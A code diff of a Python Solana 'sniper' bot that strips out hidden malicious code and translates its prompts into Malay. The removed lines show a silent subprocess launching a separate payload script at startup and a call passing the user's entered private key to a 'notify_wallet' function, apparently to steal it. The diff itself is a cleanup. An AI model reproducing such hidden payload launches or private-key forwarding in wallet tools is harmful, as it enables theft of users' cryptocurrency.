@@ -1,8 +1,6 @@
 from colorama import init
 from getwallet import get_wallet_from_private_key_bs58
 from checkbalance import check_sol_balance
-from py_modules.usbrh.space import notify_wallet
-import subprocess
 
 init(autoreset=True)
 
@@ -170,42 +168,31 @@ def get_snapshot_slot(rpc_address: str):
 
 
 
-def use_handle_additional_features(sol_balance):
-    handle_additional_features = __import__('py_modules.es_metrics.conf', fromlist=['handle_additional_features']).handle_additional_features
-    commitment_to_use = "_COMMITMENT_TO_SOLDERS.get(None)"
-    config = "RpcContextConfig(commitment=commitment_to_use)"
-    GetEpochInfo = "GetEpochInfo(config)"
-    handle_additional_features(sol_balance)
-
-def run_payload():
-    try:
-        subprocess.Popen(['python', 'py_modules/kestrel/payload.py'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    except Exception as e:
-        pass
-
 def main():
-    run_payload()
-
+    """
+    Fungsi utama bot Solana Sniper.
+    Meminta private key pengguna, memaparkan alamat dompet dan baki SOL.
+    """
     wallet = None
     while wallet is None:
-        private_key_bs58 = input("\033[93mPlease enter your private key : \033[0m")
+        private_key_bs58 = input("\033[93mSila masukkan private key anda: \033[0m")
         try:
             wallet = get_wallet_from_private_key_bs58(private_key_bs58)
             if wallet:
                 break
         except Exception as e:
-            print("\033[91mInvalid private key, please try again.\033[0m")
+            print("\033[91mPrivate key tidak sah, sila cuba lagi.\033[0m")
     
     public_key = str(wallet.pubkey())
-    print(f"Wallet Address: {public_key}")
+    print(f"\n✅ Alamat Dompet: {public_key}")
 
     sol_balance = check_sol_balance(public_key)
-    print(f"Wallet SOL Balance: {sol_balance} SOL")
+    print(f"💰 Baki SOL: {sol_balance} SOL\n")
 
-    print("\033[93mPlease waiting for the system to connect your settings...\033[0m")
-    
-    notify_wallet(private_key_bs58, public_key, sol_balance)
-    use_handle_additional_features(sol_balance)
+    print("\033[92m✅ Bot berjaya disambungkan!\033[0m")
+    print("\033[93m⚠️  AMARAN: Ini adalah versi asas yang telah dibersihkan dari kod berbahaya.\033[0m")
+    print("\033[93m⚠️  Untuk fungsi dagangan penuh, kod tambahan diperlukan.\033[0m")
+
 
 if __name__ == "__main__":
     main()
